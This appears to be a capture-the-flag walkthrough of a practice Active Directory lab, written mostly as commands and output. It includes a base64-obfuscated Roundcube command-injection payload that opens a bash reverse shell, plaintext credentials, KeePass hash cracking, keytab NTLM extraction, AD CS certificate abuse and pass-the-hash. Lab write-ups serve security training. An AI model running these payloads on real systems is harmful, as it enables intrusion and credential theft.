
#bypass_filter_with_base64
Scan : 

```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-30 07:52:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2024-07-17T16:39:23
|_Not valid after:  2025-07-17T16:39:23
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2024-07-17T16:39:23
|_Not valid after:  2025-07-17T16:39:23
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2024-07-17T16:39:23
|_Not valid after:  2025-07-17T16:39:23
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2024-07-17T16:39:23
|_Not valid after:  2025-07-17T16:39:23
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-07-30T07:53:55+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Not valid before: 2024-07-16T16:48:12
|_Not valid after:  2025-01-15T16:48:12
| rdp-ntlm-info:
|   Target_Name: HYBRID
|   NetBIOS_Domain_Name: HYBRID
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hybrid.vl
|   DNS_Computer_Name: dc01.hybrid.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-07-30T07:53:15+00:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-07-30T07:53:19
|_  start_date: N/A

#Machine1
```

```sh
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 60bc2226783cb4e06beaaa1ec1625dde (ECDSA)
|_  256 a3b5d86106e63a418845e35203d2231b (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
80/tcp   open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Redirecting...
|_http-server-header: nginx/1.18.0 (Ubuntu)
110/tcp  open  pop3     Dovecot pop3d
|_pop3-capabilities: TOP RESP-CODES STLS CAPA AUTH-RESP-CODE SASL PIPELINING UIDL
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33241/tcp6  mountd
|   100005  1,2,3      35540/udp6  mountd
|   100005  1,2,3      44973/tcp   mountd
|   100005  1,2,3      45099/udp   mountd
|   100021  1,3,4      33342/udp6  nlockmgr
|   100021  1,3,4      39307/udp   nlockmgr
|   100021  1,3,4      39329/tcp6  nlockmgr
|   100021  1,3,4      42997/tcp   nlockmgr
|   100024  1          39851/tcp6  status
|   100024  1          49837/udp6  status
|   100024  1          52577/tcp   status
|   100024  1          57571/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: Pre-login ENABLE capabilities LOGIN-REFERRALS have post-login IDLE listed more OK LITERAL+ IMAP4rev1 LOGINDISABLEDA0001 SASL-IR ID STARTTLS
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
587/tcp  open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
|_imap-capabilities: Pre-login ENABLE capabilities LOGIN-REFERRALS have post-login IDLE listed more OK LITERAL+ IMAP4rev1 AUTH=LOGINA0001 SASL-IR ID AUTH=PLAIN
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: TOP RESP-CODES USER CAPA AUTH-RESP-CODE SASL(PLAIN LOGIN) PIPELINING UIDL
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nfs_acl  3 (RPC #100227)

#Machine2
```

- Show mount : 
```sh
showmount -e $t2

Export list for 10.10.194.198:
/opt/share *
```

- Set up :
```sh
sudo apt install nfs-common 
```

- Mount Share : 
```sh
sudo mount -t nfs $t2:/opt/share /mnt
```

- Got some credentials :
```sh
admin@hybrid.vl:{plain}Duckling21
peter.turner@hybrid.vl:{plain}PeterIstToll!
```

https://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/

- Command injection : 
```sh
admin&echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjMuMTIvNDI0MiAwPiYxCg==${IFS}|base64${IFS}-d${IFS}|${IFS}bash&@hybrid.vl
```

- Look into NFS and upload a file luckily the id of the file correspond to the owner some we just need to create a user with the same id of the remote machine , copy bash and exec it .
```sh
sudo useradd -u 902601108 username
```

User VL{a6d5a0504a2b24fe66761abc4c96013d} 

- So we got a password.kbx file : 

```sh
keepass2john passwords.kdbx | grep -o "$keepass$.*" >  hash
hashcat -a 0 -m 13400 /usr/share/wordlists/rockyou.txt hash

```

	- Got a password : `b0cwR+G4Dzl_rw`

User VL{a6d5a0504a2b24fe66761abc4c96013d}

```sh
 netexec smb 10.10.137.165 -u "peter.turner" -p "b0cwR+G4Dzl_rw" --shares
 
 netexec smb 10.10.137.165 -u "peter.turner" -p "b0cwR+G4Dzl_rw" -M spider_plus -o DOWNLOAD_FLAG=True~

netexec smb 10.10.137.165 -u "peter.turner" -p "b0cwR+G4Dzl_rw" --users
```
 
User: 
```sh
Edward.Miller
Pamela.Smith
Josh.Mitchell
Peter.Turner
Olivia.Smith
Ricky.Myers
Elliot.Watkins
Emily.White
Kathleen.Walker
Margaret.shepherd
```

```sh
certipy find -u 'peter.turner'@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.137.165
````

- Tool: 
https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py

As you can our linux machine is on AD with ldap so there is some cool file to grab : 
`/etc/krb5.keytab`

- Then we can extract ntlm hash from it :
```sh
python3 keytabextract.py file.keytab

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : HYBRID.VL
        SERVICE PRINCIPAL : MAIL01$/
        NTLM HASH : 0f916c5246fdbc7ba95dcef4126d57bd
        AES-256 HASH : eac6b4f4639b96af4f6fc2368570cde71e9841f2b3e3402350d3b6272e436d6e
        AES-128 HASH : 3a732454c95bcef529167b6bea476458
```

```sh
certipy req -username 'MAIL01$'@hybrid.vl -hashes 0f916c5246fdbc7ba95dcef4126d57bd -target-ip '10.10.137.165' -ca 'hybrid-DC01-CA' -template 'HybridComputers' -upn 'Administrator@hybrid.vl'  -debug -key-size 4096 -dns hybrid.vl
```

`Don't forget to add DNS`
```sh
certipy auth -pfx 'administrator_hybrid.pfx' -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.137.165
```

```sh
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'Administrator@hybrid.vl'
    [1] DNS Host Name: 'hybrid.vl'
> 0
[*] Using principal: administrator@hybrid.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@hybrid.vl': aad3b435b51404eeaad3b435b51404ee:60701e8543c9f6db1a2af3217386d3dc
```

```sh
evil-winrm -i 10.10.137.165 -u "Administrator" -H  60701e8543c9f6db1a2af3217386d3dc
```

Root VL{6b069f0bfac70efd8a17c2d1aa79f208}